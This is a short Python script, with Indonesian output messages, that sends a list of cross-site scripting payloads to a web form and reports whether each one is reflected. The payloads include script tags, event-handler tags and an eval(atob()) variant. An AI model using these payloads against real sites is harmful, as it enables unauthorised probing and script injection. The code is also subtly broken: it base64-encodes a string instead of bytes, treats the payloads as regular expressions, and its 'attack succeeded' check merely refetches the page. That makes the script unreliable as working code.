import requests
import re
import base64

def test_xss(url, payload):
    response = requests.post(url, data={"payload": payload})
    if re.search(payload, response.text):
        print("Kerentanan XSS ditemukan di URL:", url)
        print("Payload:", payload)
        print("Lokasi:", re.search(payload, response.text).span())

        try:
            print("Serangan berhasil:", requests.get(response.url).text)
        except requests.exceptions.ConnectionError:
            print("Serangan gagal: koneksi ke server terputus")
    else:
        print("Kerentanan XSS tidak ditemukan di URL:", url)

if __name__ == "__main__":
    url = "https://example.com/"
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src=x onerror='alert(document.domain)'>",
        "<iframe src='https://example.com/' onload='alert(document.domain)'>",
        "<svg onload='alert(document.domain)'>",
        "<canvas onload='alert(document.domain)'>",
        "<style>body{display:none}</style><script>alert(document.location.href)</script>",
        "<img src='/xss.png' onerror='eval(atob(" + base64.b64encode("document.location.href") + "))'>",
    ]

    for payload in payloads:
        test_xss(url, payload)
